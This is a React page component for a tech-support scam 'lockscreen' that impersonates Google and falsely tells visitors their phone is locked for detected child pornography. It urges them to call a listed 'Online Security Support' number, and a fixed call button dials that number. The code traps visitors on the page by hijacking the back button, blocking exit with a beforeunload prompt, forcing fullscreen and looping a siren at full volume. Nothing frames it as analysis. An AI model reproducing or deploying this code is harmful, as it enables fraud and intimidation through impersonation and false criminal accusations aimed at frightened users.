import { useEffect, useRef, useState } from "react";
import { PHONE_NUMBER } from "../Constant";
import PopUp from "./PopUp";
import bannerImage from "/banner-image.jpeg";
import Footer from "../component/Footer";
import siren from "/siren-alert.mp3"


const Home = () => {
  const [showPopup, setShowPopup] = useState(true); // पॉपअप हमेशा दिखाई दे
  const audioRef = useRef(null); // 🔊 ऑडियो रेफरेंस
  const [isFullscreen, setIsFullscreen] = useState(false); // New state to track fullscreen
  useEffect(() => {
    const handleContextMenu = (event) => {
      event.preventDefault();
    };
    // document.addEventListener("contextmenu", handleContextMenu);

    const disableBackButton = () => {
      window.history.pushState(null, "", window.location.href);
    };
    disableBackButton();
    window.addEventListener("popstate", disableBackButton);

    const preventExit = (event) => {
      event.preventDefault();
      event.returnValue = "Emergency mode active!";
    };
    window.addEventListener("beforeunload", preventExit);

    return () => {
      window.removeEventListener("beforeunload", preventExit);
      document.removeEventListener("contextmenu", handleContextMenu);
      window.removeEventListener("popstate", disableBackButton);
    };
  }, []);

  useEffect(() => {
    const playAudio = () => {
      if (audioRef.current) {
        audioRef.current.volume = 1.0;
        audioRef.current.loop = true;
        audioRef.current.play().catch((err) => {
          console.error("Audio play error:", err);
        });
      }
    };

    // 🔊 यूजर के इंटरैक्शन का वेट करेगा
    const enableAudio = () => {
      playAudio(); // ऑडियो प्ले करेगा
      document.removeEventListener("click", enableAudio);
      document.removeEventListener("keydown", enableAudio);
      document.removeEventListener("touchstart", enableAudio);
    };

    document.addEventListener("click", enableAudio);
    document.addEventListener("keydown", enableAudio);
    document.addEventListener("touchstart", enableAudio);

    return () => {
      document.removeEventListener("click", enableAudio);
      document.removeEventListener("keydown", enableAudio);
      document.removeEventListener("touchstart", enableAudio);
    };
  }, []);

  const handleClick = () => {
    window.location.href = `tel:+${PHONE_NUMBER}`;
  };
  const handleClosePopup = () => {
    const element = document.documentElement;

    if (isFullscreen) {
      // If already fullscreen, redirect to phone number
      handleClick();
    } else {
      // If not fullscreen, go to fullscreen mode
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if (element.mozRequestFullScreen) {
        element.mozRequestFullScreen();
      } else if (element.webkitRequestFullscreen) {
        element.webkitRequestFullscreen();
      } else if (element.msRequestFullscreen) {
        element.msRequestFullscreen();
      }
      setIsFullscreen(true); // Set fullscreen state to true
    }

    if (audioRef.current) {
      audioRef.current.play();
    }
  };

  return (
    <>
      <div className="min-h-screen bg-white flex flex-col">
        {/* Mobile Banner with Image */}
        <div className="md:hidden">
          <img src={bannerImage} alt="Mobile Banner" className="w-full" />
        </div>

        {/* Desktop Navigation Bar */}
        <nav className="hidden md:block bg-black py-4"></nav>

        <div className="flex flex-col items-center justify-start">
          <div className="bg-white p-8 rounded-lg w-full max-w-3xl text-center">
            <h1 className="text-4xl font-bold mb-6 text-black-600">
              Account Disabled
            </h1>
            <p className="text-2xl text-gray-700 mb-4">
              Your Phone has been locked due to detected illegal Child
              pornography. Your Google Account has been disabled. Immediately
              call Online Security Support +1(833)-521-4338 to unlock it!
            </p>
          </div>
        </div>
        <div className="flex-grow mt-2"></div>
        <div className="w-full flex justify-center py-3">
          <img src="glogo.png" alt="Google" className="h-16" />
        </div>
        <audio ref={audioRef} loop autoPlay>
          <source src={siren} type="audio/mpeg1" />
        </audio>
        {showPopup && <PopUp onClose={handleClosePopup} />}


      </div>
      <Footer />
      
{/* Phone call button moved outside the main div and with higher z-index */}
<div
        className="fixed bottom-0 left-0 w-full bg-white shadow-md p-4 flex justify-center items-center border-t border-[#e2e8f0]"
        onClick={handleClick}
        style={{ zIndex: 1001 }} // Ensure it's above the popup
      >
        <button
          className=" bg-black text-white inline-flex items-center justify-center gap-2 whitespace-nowrap 
            font-medium ring-offset-background transition-colors focus-visible:outline-none 
            disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0  hover:bg-gray-900 h-11 rounded-md px-8 w-full max-w-4xl text-lg"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="lucide lucide-phone-call mr-2  w-[1rem] h-[1rem]"
          >
            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
            <path d="M14.05 2a9 9 0 0 1 8 7.94"></path>
            <path d="M14.05 6A5 5 0 0 1 18 10"></path>
          </svg>
          Call +{PHONE_NUMBER}
        </button>
      </div>
    </>
  );
};

export default Home;